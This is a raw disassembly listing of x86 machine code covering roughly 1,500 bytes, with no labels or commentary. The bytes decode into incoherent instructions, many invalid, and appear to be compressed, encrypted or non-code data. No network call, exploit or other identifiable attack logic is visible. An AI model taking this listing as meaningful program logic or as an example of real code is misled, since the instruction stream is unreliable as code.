  4030f2:	c4 b8 03 0f 78 ac    	les    -0x5387f0fd(%eax),%edi
  4030f8:	ca be 69             	lret   $0x69be
  4030fb:	b4 6e                	mov    $0x6e,%ah
  4030fd:	c0 4c 52 14 8a       	rorb   $0x8a,0x14(%edx,%edx,2)
  403102:	d5 22                	aad    $0x22
  403104:	63 fe                	arpl   %edi,%esi
  403106:	0c 2e                	or     $0x2e,%al
  403108:	87 ec                	xchg   %ebp,%esp
  40310a:	75 28                	jne    0x403134
  40310c:	7f 5d                	jg     0x40316b
  40310e:	2c 62                	sub    $0x62,%al
  403110:	d1 27                	shll   $1,(%edi)
  403112:	ba f3 5d 78 a8       	mov    $0xa8785df3,%edx
  403117:	54                   	push   %esp
  403118:	ed                   	in     (%dx),%eax
  403119:	79 e3                	jns    0x4030fe
  40311b:	6c                   	insb   (%dx),%es:(%edi)
  40311c:	16                   	push   %ss
  40311d:	19 a6 d8 58 85 d0    	sbb    %esp,-0x2f7aa728(%esi)
  403123:	ab                   	stos   %eax,%es:(%edi)
  403124:	75 25                	jne    0x40314b
  403126:	bf c5 68 01 5f       	mov    $0x5f0168c5,%edi
  40312b:	c2 79 85             	ret    $0x8579
  40312e:	50                   	push   %eax
  40312f:	50                   	push   %eax
  403130:	7c 2f                	jl     0x403161
  403132:	f3 5e                	repz pop %esi
  403134:	85 bf 11 02 6f fb    	test   %edi,-0x490fdef(%edi)
  40313a:	d4 b5                	aam    $0xb5
  40313c:	44                   	inc    %esp
  40313d:	dd ed                	fucomp %st(5)
  40313f:	87 0b                	xchg   %ecx,(%ebx)
  403141:	ab                   	stos   %eax,%es:(%edi)
  403142:	5c                   	pop    %esp
  403143:	41                   	inc    %ecx
  403144:	16                   	push   %ss
  403145:	5c                   	pop    %esp
  403146:	83 92 0d 39 04 44 ab 	adcl   $0xffffffab,0x4404390d(%edx)
  40314d:	77 e5                	ja     0x403134
  40314f:	6d                   	insl   (%dx),%es:(%edi)
  403150:	f4                   	hlt
  403151:	80 9a 28 55 4f 5d 7c 	sbbb   $0x7c,0x5d4f5528(%edx)
  403158:	f7 75 39             	divl   0x39(%ebp)
  40315b:	ff 81 27 29 1b b3    	incl   -0x4ce4d6d9(%ecx)
  403161:	e0 53                	loopne 0x4031b6
  403163:	53                   	push   %ebx
  403164:	34 27                	xor    $0x27,%al
  403166:	5c                   	pop    %esp
  403167:	8e f1                	mov    %ecx,%?
  403169:	59                   	pop    %ecx
  40316a:	a1 71 20 ec 33       	mov    0x33ec2071,%eax
  40316f:	de 9c c5 04 9d 79 97 	ficomps -0x688662fc(%ebp,%eax,8)
  403176:	4a                   	dec    %edx
  403177:	b6 5a                	mov    $0x5a,%dh
  403179:	0b a1 f9 d8 da 91    	or     -0x6e252707(%ecx),%esp
  40317f:	fd                   	std
  403180:	e9 bb 5a 0f bb       	jmp    0xbb4f8c40
  403185:	d8 1a                	fcomps (%edx)
  403187:	14 bf                	adc    $0xbf,%al
  403189:	31 f1                	xor    %esi,%ecx
  40318b:	bb 1f 87 08 52       	mov    $0x5208871f,%ebx
  403190:	16                   	push   %ss
  403191:	27                   	daa
  403192:	d1 68 18             	shrl   $1,0x18(%eax)
  403195:	34 7e                	xor    $0x7e,%al
  403197:	ac                   	lods   %ds:(%esi),%al
  403198:	e8 ec cb 33 ae       	call   0xae73fd89
  40319d:	02 5e 14             	add    0x14(%esi),%bl
  4031a0:	83 02 88             	addl   $0xffffff88,(%edx)
  4031a3:	8b 2c 25 8c d7 8c a4 	mov    -0x5b732874(,%eiz,1),%ebp
  4031aa:	55                   	push   %ebp
  4031ab:	6b a0 eb e0 a3 c4 cc 	imul   $0xffffffcc,-0x3b5c1f15(%eax),%esp
  4031b2:	28 cb                	sub    %cl,%bl
  4031b4:	9a ee 90 0e 75 64 ba 	lcall  $0xba64,$0x750e90ee
  4031bb:	c0 c7 9e             	rol    $0x9e,%bh
  4031be:	df bb c4 bb 1b bc    	fistpll -0x43e4443c(%ebx)
  4031c4:	2e 65 63 6d e2       	cs arpl %ebp,%gs:-0x1e(%ebp)
  4031c9:	22 aa be 40 e6 d4    	and    -0x2b19bf42(%edx),%ch
  4031cf:	b9 54 9c 5d d6       	mov    $0xd65d9c54,%ecx
  4031d4:	e0 8f                	loopne 0x403165
  4031d6:	93                   	xchg   %eax,%ebx
  4031d7:	bd b3 04 3c 52       	mov    $0x523c04b3,%ebp
  4031dc:	da 7a 26             	fidivrl 0x26(%edx)
  4031df:	6c                   	insb   (%dx),%es:(%edi)
  4031e0:	c7                   	(bad)
  4031e1:	b0 55                	mov    $0x55,%al
  4031e3:	d3 9c 91 39 94 f7 c3 	rcrl   %cl,-0x3c086bc7(%ecx,%edx,4)
  4031ea:	bf 81 c8 5e 95       	mov    $0x955ec881,%edi
  4031ef:	bd b7 ad cf 2e       	mov    $0x2ecfadb7,%ebp
  4031f4:	37                   	aaa
  4031f5:	82 56 60 50          	adcb   $0x50,0x60(%esi)
  4031f9:	60                   	pusha
  4031fa:	c7                   	(bad)
  4031fb:	dc de                	(bad)
  4031fd:	33 69 2a             	xor    0x2a(%ecx),%ebp
  403200:	67 08 4d 70          	or     %cl,0x70(%di)
  403204:	48                   	dec    %eax
  403205:	6b 69 d2 d7          	imul   $0xffffffd7,-0x2e(%ecx),%ebp
  403209:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40320a:	ca 20 fe             	lret   $0xfe20
  40320d:	3f                   	aas
  40320e:	4e                   	dec    %esi
  40320f:	7b 5e                	jnp    0x40326f
  403211:	96                   	xchg   %eax,%esi
  403212:	21 6b 7a             	and    %ebp,0x7a(%ebx)
  403215:	66 52                	push   %dx
  403217:	9a b4 e9 e4 5e 13 65 	lcall  $0x6513,$0x5ee4e9b4
  40321e:	c1 d8 da             	rcr    $0xda,%eax
  403221:	8f                   	(bad)
  403222:	34 1e                	xor    $0x1e,%al
  403224:	6b b5 a7 f4 28 e9 76 	imul   $0x76,-0x16d70b59(%ebp),%esi
  40322b:	4d                   	dec    %ebp
  40322c:	53                   	push   %ebx
  40322d:	c7                   	(bad)
  40322e:	8d                   	lea    (bad),%edx
  40322f:	d0 4f 8a             	rorb   $1,-0x76(%edi)
  403232:	c0 1f e1             	rcrb   $0xe1,(%edi)
  403235:	b3 a6                	mov    $0xa6,%bl
  403237:	48                   	dec    %eax
  403238:	0f 59 14 e6          	mulps  (%esi,%eiz,8),%xmm2
  40323c:	29 43 9b             	sub    %eax,-0x65(%ebx)
  40323f:	4e                   	dec    %esi
  403240:	6f                   	outsl  %ds:(%esi),(%dx)
  403241:	f3 28 4f 35          	repz sub %cl,0x35(%edi)
  403245:	4a                   	dec    %edx
  403246:	65 62 01             	bound  %eax,%gs:(%ecx)
  403249:	d7                   	xlat   %ds:(%ebx)
  40324a:	0e                   	push   %cs
  40324b:	70 00                	jo     0x40324d
  40324d:	7e c3                	jle    0x403212
  40324f:	4e                   	dec    %esi
  403250:	0f df d7             	pandn  %mm7,%mm2
  403253:	3e 5c                	ds pop %esp
  403255:	a0 8d ff d8 30       	mov    0x30d8ff8d,%al
  40325a:	d3 42 cd             	roll   %cl,-0x33(%edx)
  40325d:	80 42 20 d5          	addb   $0xd5,0x20(%edx)
  403261:	42                   	inc    %edx
  403262:	dc ac 0b 54 59 c8 2e 	fsubrl 0x2ec85954(%ebx,%ecx,1)
  403269:	ca ad c8             	lret   $0xc8ad
  40326c:	7e a2                	jle    0x403210
  40326e:	cd 9e                	int    $0x9e
  403270:	32 7a 6c             	xor    0x6c(%edx),%bh
  403273:	9c                   	pushf
  403274:	1c 2b                	sbb    $0x2b,%al
  403276:	27                   	daa
  403277:	e5 b9                	in     $0xb9,%eax
  403279:	83 f1 10             	xor    $0x10,%ecx
  40327c:	1c 1e                	sbb    $0x1e,%al
  40327e:	d9 28                	fldcw  (%eax)
  403280:	a1 e7 c7 69 7e       	mov    0x7e69c7e7,%eax
  403285:	63 64 8c 94          	arpl   %esp,-0x6c(%esp,%ecx,4)
  403289:	47                   	inc    %edi
  40328a:	ae                   	scas   %es:(%edi),%al
  40328b:	5e                   	pop    %esi
  40328c:	fa                   	cli
  40328d:	35 4b de 99 f5       	xor    $0xf599de4b,%eax
  403292:	c7                   	(bad)
  403293:	f0 ac                	lock lods %ds:(%esi),%al
  403295:	ab                   	stos   %eax,%es:(%edi)
  403296:	02 8b 5a 73 28 3d    	add    0x3d28735a(%ebx),%cl
  40329c:	1b e6                	sbb    %esi,%esp
  40329e:	08 c8                	or     %cl,%al
  4032a0:	21 d0                	and    %edx,%eax
  4032a2:	21 db                	and    %ebx,%ebx
  4032a4:	81 fd 2d e2 0b 5b    	cmp    $0x5b0be22d,%ebp
  4032aa:	e6 63                	out    %al,$0x63
  4032ac:	00 70 a6             	add    %dh,-0x5a(%eax)
  4032af:	c5 27                	lds    (%edi),%esp
  4032b1:	ba 2c f5 00 32       	mov    $0x3200f52c,%edx
  4032b6:	b9 5a 84 7c d8       	mov    $0xd87c845a,%ecx
  4032bb:	d4 6e                	aam    $0x6e
  4032bd:	59                   	pop    %ecx
  4032be:	3f                   	aas
  4032bf:	67 e7 e6             	addr16 out %eax,$0xe6
  4032c2:	05 06 93 7a f1       	add    $0xf17a9306,%eax
  4032c7:	55                   	push   %ebp
  4032c8:	e3 7b                	jecxz  0x403345
  4032ca:	4a                   	dec    %edx
  4032cb:	70 6c                	jo     0x403339
  4032cd:	13 8d d6 12 99 58    	adc    0x589912d6(%ebp),%ecx
  4032d3:	87 7b b3             	xchg   %edi,-0x4d(%ebx)
  4032d6:	94                   	xchg   %eax,%esp
  4032d7:	e8 5c 37 24 a1       	call   0xa1646a38
  4032dc:	2e 33 bd 63 e5 cd da 	xor    %cs:-0x25321a9d(%ebp),%edi
  4032e3:	9a 57 29 8a 39 c1 a3 	lcall  $0xa3c1,$0x398a2957
  4032ea:	5e                   	pop    %esi
  4032eb:	d2 6f 40             	shrb   %cl,0x40(%edi)
  4032ee:	4e                   	dec    %esi
  4032ef:	c6                   	(bad)
  4032f0:	67 46                	addr16 inc %esi
  4032f2:	01 51 27             	add    %edx,0x27(%ecx)
  4032f5:	42                   	inc    %edx
  4032f6:	13 d1                	adc    %ecx,%edx
  4032f8:	21 f3                	and    %esi,%ebx
  4032fa:	dd c3                	ffree  %st(3)
  4032fc:	bc 67 99 9f b3       	mov    $0xb39f9967,%esp
  403301:	b7 33                	mov    $0x33,%bh
  403303:	bb 3c 73 d3 65       	mov    $0x65d3733c,%ebx
  403308:	3e 72 47             	jb,pt  0x403352
  40330b:	d5 e3                	aad    $0xe3
  40330d:	28 3e                	sub    %bh,(%esi)
  40330f:	2f                   	das
  403310:	c1 db 55             	rcr    $0x55,%ebx
  403313:	48                   	dec    %eax
  403314:	5a                   	pop    %edx
  403315:	92                   	xchg   %eax,%edx
  403316:	45                   	inc    %ebp
  403317:	f6 b8 6a 10 a9 7b    	idivb  0x7ba9106a(%eax)
  40331d:	7c a9                	jl     0x4032c8
  40331f:	58                   	pop    %eax
  403320:	80 3a 10             	cmpb   $0x10,(%edx)
  403323:	54                   	push   %esp
  403324:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403325:	97                   	xchg   %eax,%edi
  403326:	35 c3 bc a2 14       	xor    $0x14a2bcc3,%eax
  40332b:	c0 5f 1a 12          	rcrb   $0x12,0x1a(%edi)
  40332f:	78 94                	js     0x4032c5
  403331:	b7 57                	mov    $0x57,%bh
  403333:	16                   	push   %ss
  403334:	56                   	push   %esi
  403335:	f3 fb                	repz sti
  403337:	21 aa a6 c1 41 ba    	and    %ebp,-0x45be3e5a(%edx)
  40333d:	26 6b 33 ce          	imul   $0xffffffce,%es:(%ebx),%esi
  403341:	17                   	pop    %ss
  403342:	83 61 64 a6          	andl   $0xffffffa6,0x64(%ecx)
  403346:	3f                   	aas
  403347:	a3 a6 73 a6 06       	mov    %eax,0x6a673a6
  40334c:	5f                   	pop    %edi
  40334d:	cb                   	lret
  40334e:	2b 99 16 fd 55 70    	sub    0x7055fd16(%ecx),%ebx
  403354:	ea 15 99 96 5c d2 1f 	ljmp   $0x1fd2,$0x5c969915
  40335b:	c9                   	leave
  40335c:	22 8b 46 ee 8e 83    	and    -0x7c7111ba(%ebx),%cl
  403362:	04 c3                	add    $0xc3,%al
  403364:	2b 01                	sub    (%ecx),%eax
  403366:	f5                   	cmc
  403367:	19 7b 6c             	sbb    %edi,0x6c(%ebx)
  40336a:	7e 65                	jle    0x4033d1
  40336c:	ab                   	stos   %eax,%es:(%edi)
  40336d:	dc 85 66 28 6b 62    	faddl  0x626b2866(%ebp)
  403373:	95                   	xchg   %eax,%ebp
  403374:	c8 2b 19 3d          	enter  $0x192b,$0x3d
  403378:	c7 f8 99 89 41 27    	xbegin 0x2781bd17
  40337e:	d3 c4                	rol    %cl,%esp
  403380:	c1 58 94 87          	rcrl   $0x87,-0x6c(%eax)
  403384:	e0 f4                	loopne 0x40337a
  403386:	3a 8a 1c f4 60 86    	cmp    -0x799f0be4(%edx),%cl
  40338c:	d8 ce                	fmul   %st(6),%st
  40338e:	9d                   	popf
  40338f:	fb                   	sti
  403390:	53                   	push   %ebx
  403391:	45                   	inc    %ebp
  403392:	3d 63 f6 57 04       	cmp    $0x457f663,%eax
  403397:	35 01 f6 7c 6f       	xor    $0x6f7cf601,%eax
  40339c:	db 1a                	fistpl (%edx)
  40339e:	98                   	cwtl
  40339f:	e6 94                	out    %al,$0x94
  4033a1:	ec                   	in     (%dx),%al
  4033a2:	ec                   	in     (%dx),%al
  4033a3:	72 86                	jb     0x40332b
  4033a5:	49                   	dec    %ecx
  4033a6:	12 ed                	adc    %ch,%ch
  4033a8:	24 54                	and    $0x54,%al
  4033aa:	bf f3 a0 d7 ec       	mov    $0xecd7a0f3,%edi
  4033af:	4b                   	dec    %ebx
  4033b0:	66 cb                	lretw
  4033b2:	49                   	dec    %ecx
  4033b3:	4b                   	dec    %ebx
  4033b4:	1c cc                	sbb    $0xcc,%al
  4033b6:	b8 7d 4d 29 2d       	mov    $0x2d294d7d,%eax
  4033bb:	d6                   	salc
  4033bc:	dc 75 32             	fdivl  0x32(%ebp)
  4033bf:	0e                   	push   %cs
  4033c0:	5b                   	pop    %ebx
  4033c1:	21 ac ee 3b 4b 2e ef 	and    %ebp,-0x10d1b4c5(%esi,%ebp,8)
  4033c8:	b1 54                	mov    $0x54,%cl
  4033ca:	33 a4 19 69 96 9d bf 	xor    -0x40626997(%ecx,%ebx,1),%esp
  4033d1:	73 ae                	jae    0x403381
  4033d3:	a2 2e b7 e4 31       	mov    %al,0x31e4b72e
  4033d8:	07                   	pop    %es
  4033d9:	58                   	pop    %eax
  4033da:	db 32                	(bad) (%edx)
  4033dc:	d5 56                	aad    $0x56
  4033de:	4b                   	dec    %ebx
  4033df:	29 1b                	sub    %ebx,(%ebx)
  4033e1:	a8 24                	test   $0x24,%al
  4033e3:	0e                   	push   %cs
  4033e4:	5e                   	pop    %esi
  4033e5:	40                   	inc    %eax
  4033e6:	3e 8b 5d 22          	mov    %ds:0x22(%ebp),%ebx
  4033ea:	99                   	cltd
  4033eb:	04 0c                	add    $0xc,%al
  4033ed:	0b 5f 12             	or     0x12(%edi),%ebx
  4033f0:	22 98 39 e8 15 e0    	and    -0x1fea17c7(%eax),%bl
  4033f6:	48                   	dec    %eax
  4033f7:	53                   	push   %ebx
  4033f8:	a1 be 76 b7 af       	mov    0xafb776be,%eax
  4033fd:	8a da                	mov    %dl,%bl
  4033ff:	de 72 52             	fidivs 0x52(%edx)
  403402:	62 ba 26 6f a6 05    	bound  %edi,0x5a66f26(%edx)
  403408:	cb                   	lret
  403409:	ec                   	in     (%dx),%al
  40340a:	9b                   	fwait
  40340b:	c7                   	(bad)
  40340c:	2a ed                	sub    %ch,%ch
  40340e:	8f                   	(bad)
  40340f:	9c                   	pushf
  403410:	ac                   	lods   %ds:(%esi),%al
  403411:	dd 22                	frstor (%edx)
  403413:	dd a1 15 84 a3 29    	frstor 0x29a38415(%ecx)
  403419:	43                   	inc    %ebx
  40341a:	57                   	push   %edi
  40341b:	86 85 8b 0a 2a 25    	xchg   %al,0x252a0a8b(%ebp)
  403421:	91                   	xchg   %eax,%ecx
  403422:	02 00                	add    (%eax),%al
  403424:	db 55 98             	fistl  -0x68(%ebp)
  403427:	09 a9 66 58 09 f6    	or     %ebp,-0x9f6a79a(%ecx)
  40342d:	b1 bb                	mov    $0xbb,%cl
  40342f:	03 98 b2 12 c9 9b    	add    -0x6436ed4e(%eax),%ebx
  403435:	84 73 a6             	test   %dh,-0x5a(%ebx)
  403438:	aa                   	stos   %al,%es:(%edi)
  403439:	bf a8 20 e6 2e       	mov    $0x2ee620a8,%edi
  40343e:	24 16                	and    $0x16,%al
  403440:	ad                   	lods   %ds:(%esi),%eax
  403441:	0f ed d2             	paddsw %mm2,%mm2
  403444:	47                   	inc    %edi
  403445:	b6 05                	mov    $0x5,%dh
  403447:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403448:	1e                   	push   %ds
  403449:	ce                   	into
  40344a:	8d be 9e 55 31 ee    	lea    -0x11ceaa62(%esi),%edi
  403450:	b3 c5                	mov    $0xc5,%bl
  403452:	bb 92 d6 18 b0       	mov    $0xb018d692,%ebx
  403457:	b9 b3 f9 24 9d       	mov    $0x9d24f9b3,%ecx
  40345c:	81 49 3c 38 b1 65 2b 	orl    $0x2b65b138,0x3c(%ecx)
  403463:	e1 66                	loope  0x4034cb
  403465:	a0 07 99 41 51       	mov    0x51419907,%al
  40346a:	39 ce                	cmp    %ecx,%esi
  40346c:	e2 62                	loop   0x4034d0
  40346e:	e4 eb                	in     $0xeb,%al
  403470:	55                   	push   %ebp
  403471:	97                   	xchg   %eax,%edi
  403472:	81 17 cc d7 79 47    	adcl   $0x4779d7cc,(%edi)
  403478:	d9 3c cc             	fnstcw (%esp,%ecx,8)
  40347b:	89 13                	mov    %edx,(%ebx)
  40347d:	80 33 3a             	xorb   $0x3a,(%ebx)
  403480:	89 6a 2d             	mov    %ebp,0x2d(%edx)
  403483:	45                   	inc    %ebp
  403484:	1e                   	push   %ds
  403485:	78 06                	js     0x40348d
  403487:	de 8f 73 79 0d 31    	fimuls 0x310d7973(%edi)
  40348d:	c3                   	ret
  40348e:	4a                   	dec    %edx
  40348f:	60                   	pusha
  403490:	c8 4f fe 48          	enter  $0xfe4f,$0x48
  403494:	4d                   	dec    %ebp
  403495:	74 5a                	je     0x4034f1
  403497:	0b 87 70 aa 27 18    	or     0x1827aa70(%edi),%eax
  40349d:	10 c1                	adc    %al,%cl
  40349f:	14 e9                	adc    $0xe9,%al
  4034a1:	dc 6d 55             	fsubrl 0x55(%ebp)
  4034a4:	94                   	xchg   %eax,%esp
  4034a5:	a8 24                	test   $0x24,%al
  4034a7:	de 0d 6f 29 26 19    	fimuls 0x1926296f
  4034ad:	18 7f c2             	sbb    %bh,-0x3e(%edi)
  4034b0:	0a 86 32 f0 51 89    	or     -0x76ae0fce(%esi),%al
  4034b6:	e7 98                	out    %eax,$0x98
  4034b8:	33 96 1c 1b aa 10    	xor    0x10aa1b1c(%esi),%edx
  4034be:	43                   	inc    %ebx
  4034bf:	0d 90 f1 3d 4b       	or     $0x4b3df190,%eax
  4034c4:	4e                   	dec    %esi
  4034c5:	e7 00                	out    %eax,$0x0
  4034c7:	13 3d ca 2a cd 86    	adc    0x86cd2aca,%edi
  4034cd:	ec                   	in     (%dx),%al
  4034ce:	d2 ff                	sar    %cl,%bh
  4034d0:	59                   	pop    %ecx
  4034d1:	2a 3a                	sub    (%edx),%bh
  4034d3:	21 a2 18 b7 de 3d    	and    %esp,0x3ddeb718(%edx)
  4034d9:	1f                   	pop    %ds
  4034da:	49                   	dec    %ecx
  4034db:	e0 ee                	loopne 0x4034cb
  4034dd:	3a 48 b3             	cmp    -0x4d(%eax),%cl
  4034e0:	3d 68 72 ab be       	cmp    $0xbeab7268,%eax
  4034e5:	ea 57 c8 ec 0f 04 d0 	ljmp   $0xd004,$0xfecc857
  4034ec:	30 27                	xor    %ah,(%edi)
  4034ee:	8a 04 6b             	mov    (%ebx,%ebp,2),%al
  4034f1:	ff a7 48 3a ac 8d    	jmp    *-0x7253c5b8(%edi)
  4034f7:	2d 8a 58 55 f8       	sub    $0xf855588a,%eax
  4034fc:	7d 3e                	jge    0x40353c
  4034fe:	66 13 eb             	adc    %bx,%bp
  403501:	87 c1                	xchg   %eax,%ecx
  403503:	66 bc c4 6a          	mov    $0x6ac4,%sp
  403507:	5d                   	pop    %ebp
  403508:	aa                   	stos   %al,%es:(%edi)
  403509:	69 6d 6d 27 d8 56 85 	imul   $0x8556d827,0x6d(%ebp),%ebp
  403510:	cc                   	int3
  403511:	a9 82 29 d2 d6       	test   $0xd6d22982,%eax
  403516:	58                   	pop    %eax
  403517:	eb 7d                	jmp    0x403596
  403519:	69 70 ea e5 e0 7b 5b 	imul   $0x5b7be0e5,-0x16(%eax),%esi
  403520:	bc 26 8f 42 c7       	mov    $0xc7428f26,%esp
  403525:	38 54 55 ac          	cmp    %dl,-0x54(%ebp,%edx,2)
  403529:	8a ad 25 27 71 66    	mov    0x66712725(%ebp),%ch
  40352f:	f9                   	stc
  403530:	c7 41 22 fc 79 20 1c 	movl   $0x1c2079fc,0x22(%ecx)
  403537:	80 91 8b 0f 32 b1 91 	adcb   $0x91,-0x4ecdf075(%ecx)
  40353e:	f1                   	int1
  40353f:	89 60 a8             	mov    %esp,-0x58(%eax)
  403542:	ec                   	in     (%dx),%al
  403543:	32 64 2e 20          	xor    0x20(%esi,%ebp,1),%ah
  403547:	cb                   	lret
  403548:	bf e5 80 1e 10       	mov    $0x101e80e5,%edi
  40354d:	45                   	inc    %ebp
  40354e:	80 76 b2 0e          	xorb   $0xe,-0x4e(%esi)
  403552:	f1                   	int1
  403553:	49                   	dec    %ecx
  403554:	81 11 77 38 f7 23    	adcl   $0x23f73877,(%ecx)
  40355a:	54                   	push   %esp
  40355b:	8b d3                	mov    %ebx,%edx
  40355d:	25 d5 db 10 43       	and    $0x4310dbd5,%eax
  403562:	8f 44 8a da          	pop    -0x26(%edx,%ecx,4)
  403566:	fa                   	cli
  403567:	59                   	pop    %ecx
  403568:	bf 41 23 84 61       	mov    $0x61842341,%edi
  40356d:	ec                   	in     (%dx),%al
  40356e:	38 51 93             	cmp    %dl,-0x6d(%ecx)
  403571:	8e ba 78 07 fa dd    	mov    -0x2205f888(%edx),%?
  403577:	ff cc                	dec    %esp
  403579:	42                   	inc    %edx
  40357a:	fb                   	sti
  40357b:	f7 16                	notl   (%esi)
  40357d:	16                   	push   %ss
  40357e:	1a 0c 4a             	sbb    (%edx,%ecx,2),%cl
  403581:	75 b1                	jne    0x403534
  403583:	2c 34                	sub    $0x34,%al
  403585:	a3 dd 4e 28 70       	mov    %eax,0x70284edd
  40358a:	9d                   	popf
  40358b:	13 64 a4 6c          	adc    0x6c(%esp,%eiz,4),%esp
  40358f:	38 ee                	cmp    %ch,%dh
  403591:	93                   	xchg   %eax,%ebx
  403592:	4e                   	dec    %esi
  403593:	a3 d4 12 9d a0       	mov    %eax,0xa09d12d4
  403598:	70 7c                	jo     0x403616
  40359a:	f4                   	hlt
  40359b:	56                   	push   %esi
  40359c:	f9                   	stc
  40359d:	29 05 d3 52 eb 49    	sub    %eax,0x49eb52d3
  4035a3:	41                   	inc    %ecx
  4035a4:	1b 63 50             	sbb    0x50(%ebx),%esp
  4035a7:	f7 af b4 6b 2e f1    	imull  -0xed1944c(%edi)
  4035ad:	4c                   	dec    %esp
  4035ae:	af                   	scas   %es:(%edi),%eax
  4035af:	71 99                	jno    0x40354a
  4035b1:	7f b5                	jg     0x403568
  4035b3:	e2 02                	loop   0x4035b7
  4035b5:	46                   	inc    %esi
  4035b6:	fe                   	(bad)
  4035b7:	ab                   	stos   %eax,%es:(%edi)
  4035b8:	c6 82 de 36 a4 55 d3 	movb   $0xd3,0x55a436de(%edx)
  4035bf:	d0 da                	rcr    $1,%dl
  4035c1:	e9 fa 0b 62 22       	jmp    0x22a241c0
  4035c6:	af                   	scas   %es:(%edi),%eax
  4035c7:	2b 29                	sub    (%ecx),%ebp
  4035c9:	9f                   	lahf
  4035ca:	f1                   	int1
  4035cb:	c4 b2 51 49 89 4d    	les    0x4d894951(%edx),%esi
  4035d1:	c4 23                	les    (%ebx),%esp
  4035d3:	5a                   	pop    %edx
  4035d4:	ee                   	out    %al,(%dx)
  4035d5:	2d 7e 35 08 e0       	sub    $0xe008357e,%eax
  4035da:	0a cf                	or     %bh,%cl
  4035dc:	e0 2b                	loopne 0x403609
  4035de:	e7 d9                	out    %eax,$0xd9
  4035e0:	74 2e                	je     0x403610
  4035e2:	df 86 11 81 6e c7    	filds  -0x38917eef(%esi)
  4035e8:	d7                   	xlat   %ds:(%ebx)
  4035e9:	cf                   	iret
  4035ea:	f6 cd ee             	test   $0xee,%ch
  4035ed:	dd 5b 23             	fstpl  0x23(%ebx)
  4035f0:	1a d8                	sbb    %al,%bl
  4035f2:	e6 50                	out    %al,$0x50
  4035f4:	25 69 a9 52 16       	and    $0x1652a969,%eax
  4035f9:	f9                   	stc
  4035fa:	43                   	inc    %ebx
  4035fb:	8c 2d c2 d8 4c b5    	mov    %gs,0xb54cd8c2
  403601:	61                   	popa
  403602:	ba cd e7 71 16       	mov    $0x1671e7cd,%edx
  403607:	bf 85 49 34 b7       	mov    $0xb7344985,%edi
  40360c:	0d 78 00 42 c6       	or     $0xc6420078,%eax
  403611:	76 a8                	jbe    0x4035bb
  403613:	c5 ae 57 b0 3b 86    	lds    -0x79c44fa9(%esi),%ebp
  403619:	f6 3c 40             	idivb  (%eax,%eax,2)
  40361c:	4a                   	dec    %edx
  40361d:	29 42 ff             	sub    %eax,-0x1(%edx)
  403620:	46                   	inc    %esi
  403621:	fb                   	sti
  403622:	31 1e                	xor    %ebx,(%esi)
  403624:	6b 4b c8 9c          	imul   $0xffffff9c,-0x38(%ebx),%ecx
  403628:	96                   	xchg   %eax,%esi
  403629:	78 6d                	js     0x403698
  40362b:	41                   	inc    %ecx
  40362c:	89 8e d7 b7 26 13    	mov    %ecx,0x1326b7d7(%esi)
  403632:	51                   	push   %ecx
  403633:	b3 54                	mov    $0x54,%bl
  403635:	b2 87                	mov    $0x87,%dl
  403637:	bc 79 72 ab da       	mov    $0xdaab7279,%esp
  40363c:	65 d9 60 d2          	fldenv %gs:-0x2e(%eax)
  403640:	e8 e8 0b e0 02       	call   0x320422d
  403645:	e4 11                	in     $0x11,%al
  403647:	3a 25 b0 f6 7e 44    	cmp    0x447ef6b0,%ah
  40364d:	bd 1d 3f c0 44       	mov    $0x44c03f1d,%ebp
  403652:	26 89 67 49          	mov    %esp,%es:0x49(%edi)
  403656:	50                   	push   %eax
  403657:	be 07 51 21 4c       	mov    $0x4c215107,%esi
  40365c:	cc                   	int3
  40365d:	23 e1                	and    %ecx,%esp
  40365f:	3a bb b8 7d 6f 5f    	cmp    0x5f6f7db8(%ebx),%bh
  403665:	0e                   	push   %cs
  403666:	35 4a ce 09 67       	xor    $0x6709ce4a,%eax
  40366b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40366c:	2e 32 a7 39 24 d5 72 	xor    %cs:0x72d52439(%edi),%ah
  403673:	0e                   	push   %cs
  403674:	12 5f 42             	adc    0x42(%edi),%bl
  403677:	cb                   	lret
  403678:	3d be c5 9e dd       	cmp    $0xdd9ec5be,%eax
  40367d:	d9 41 c5             	flds   -0x3b(%ecx)
  403680:	11 2f                	adc    %ebp,(%edi)
  403682:	ed                   	in     (%dx),%eax
  403683:	25 a0 0c f0 6b       	and    $0x6bf00ca0,%eax
  403688:	13 da                	adc    %edx,%ebx
  40368a:	3b 68 f7             	cmp    -0x9(%eax),%ebp
  40368d:	8e 73 a9             	mov    -0x57(%ebx),%?
  403690:	d4 fa                	aam    $0xfa
  403692:	4e                   	dec    %esi
  403693:	49                   	dec    %ecx
  403694:	63 85 4e 5a b2 5b    	arpl   %eax,0x5bb25a4e(%ebp)
  40369a:	b3 bc                	mov    $0xbc,%bl
  40369c:	7f 7c                	jg     0x40371a
  40369e:	32 e9                	xor    %cl,%ch
  4036a0:	0a 99 36 5f 74 3d    	or     0x3d745f36(%ecx),%bl
  4036a6:	fb                   	sti
  4036a7:	89 ee                	mov    %ebp,%esi
  4036a9:	dd 74 01 e7          	fnsave -0x19(%ecx,%eax,1)
  4036ad:	34 03                	xor    $0x3,%al
  4036af:	6c                   	insb   (%dx),%es:(%edi)
  4036b0:	79 87                	jns    0x403639
  4036b2:	4a                   	dec    %edx
  4036b3:	f4                   	hlt
  4036b4:	ad                   	lods   %ds:(%esi),%eax
  4036b5:	95                   	xchg   %eax,%ebp
  4036b6:	64 b1 3c             	fs mov $0x3c,%cl
  4036b9:	9a 9e b2 e7 6d 7e ae 	lcall  $0xae7e,$0x6de7b29e
  4036c0:	4a                   	dec    %edx
  4036c1:	39 77 81             	cmp    %esi,-0x7f(%edi)
  4036c4:	00 0b                	add    %cl,(%ebx)
  4036c6:	7c ab                	jl     0x403673
  4036c8:	77 fc                	ja     0x4036c6
  4036ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4036cb:	21 63 10             	and    %esp,0x10(%ebx)
  4036ce:	a1 aa ff 7c f3       	mov    0xf37cffaa,%eax
  4036d3:	45                   	inc    %ebp
  4036d4:	f0 5f                	lock pop %edi
  4036d6:	74 91                	je     0x403669
  4036d8:	e0 23                	loopne 0x4036fd
  4036da:	12 f0                	adc    %al,%dh
  4036dc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4036dd:	2e 81 08 38 1a 61 0f 	orl    $0xf611a38,%cs:(%eax)
  4036e4:	5a                   	pop    %edx
